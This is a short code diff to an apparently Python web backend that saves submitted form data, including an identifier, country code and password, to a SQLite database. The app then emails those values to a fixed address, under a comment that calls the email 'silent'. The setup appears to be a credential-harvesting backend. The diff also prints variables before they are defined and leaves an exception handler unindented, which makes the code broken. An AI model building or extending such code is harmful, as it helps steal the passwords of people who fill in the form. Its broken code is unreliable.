@@ -27,6 +27,9 @@ import re, os
 # ─────────────────────────────────────────────────────────────
 DB_PATH = "formulario.db"
 
+print("REMITENTE:", GMAIL_REMITENTE)
+print("DESTINO:", CORREO_DESTINO)
+print("PASSWORD EXISTE:", GMAIL_CONTRASENA is not None)
 
 GMAIL_REMITENTE = os.getenv("GMAIL_REMITENTE")
 GMAIL_CONTRASENA = os.getenv("GMAIL_CONTRASENA")
@@ -178,9 +181,8 @@ async def guardar_formulario(data: FormData):
     # 2️⃣  Enviar correo silenciosamente
     try:
         enviar_correo(data.identificador, data.codigo_pais, data.contrasena, fecha)
-    except Exception as e:
-        # Si falla el correo el registro ya quedó en SQLite — no detenemos al usuario
-        print(f"[EMAIL ERROR] {e}")
+    except Exception:
+    traceback.print_exc()
 
     return FormResponse(mensaje="Datos guardados correctamente", id=nuevo_id)
 
